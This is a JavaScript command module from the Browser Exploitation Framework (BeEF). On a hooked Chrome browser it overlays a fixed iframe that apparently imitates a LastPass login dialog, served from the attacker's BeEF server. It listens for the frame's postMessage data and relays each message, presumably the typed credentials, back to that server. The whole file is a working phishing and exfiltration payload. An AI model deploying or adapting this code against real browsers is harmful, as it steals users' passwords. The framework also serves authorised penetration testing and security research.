//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	// Prepare the onmessage event handling
	var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
	var eventer = window[eventMethod];
	var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
	eventer(messageEvent,function(e) {
		if (e.data == "KILLFRAME") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Killing Frame');	
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'meta=KILLFRAME');	
			beef.dom.removeElement('LPIFRAME');
			return;
		} else {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=' + e.data);	
		}
	},false);	

	if (beef.browser.isC()) {
		beef.dom.createIframe('custom', {'src':beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/lp/index.html','id':'LPIFRAME'}, {'width':'294px','height':'352px','position':'fixed','right':'5px','top':'0px','z-index':beef.dom.getHighestZindex()+1,'border':'1px solid white','overflow':'hidden'}); 
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Chrome IFrame Created .. awaiting messages');	
	} else {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=No IFrame Created -- browser is not Chrome', beef.are.status_error());
	}

	// $j('body').append("<div id='lp_login_dia' style='width:375px; height:415px; position: fixed; right: 0px; top: 0px; z-index: "+beef.dom.getHighestZindex()+1+"; border: 1px solid white; overflow: hidden; display: none'></div>");

	// $j('#lp_login_dia').load(beef.net.httpproto+"://"+beef.net.host+":"+beef.net.port+"/lp/index.html");



});
